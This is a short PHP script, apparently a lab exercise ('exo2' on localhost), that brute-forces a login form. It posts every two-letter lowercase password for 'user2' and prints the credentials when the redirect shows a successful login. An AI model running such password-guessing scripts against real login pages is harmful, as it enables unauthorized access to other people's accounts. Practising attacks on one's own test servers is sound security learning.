<?php

$letters = range('a', 'z');

$ch = curl_init('http://localhost:3000/Auth/exo2/login1.php'); // use a full URL to avoid relative path issues
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // don't follow redirects automatically
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // don't directly echo the response

$url0 = 'http://localhost:3000/Auth/exo2/index.php';
$url1 = 'http://localhost:3000/Auth/exo2/home.html';
function testURL($url, $url1){
        return $url === $url1;
    }

for ($i = 0; $i < count($letters); $i++) {
     for($j = 0; $j < count($letters); $j++) {
        
    $post = [
        'username' => 'user2',
        'password' => $letters[$i].$letters[$j]

    ];

    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $response = curl_exec($ch);
    $url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);

    

    if(testURL($url, $url1)){
        echo "Login successful\n";
        echo "username: {$post['username']}\n";
        echo "password: {$post['password']}\n";

    } else {
       continue;
    }
    
    
    }

}



curl_close($ch);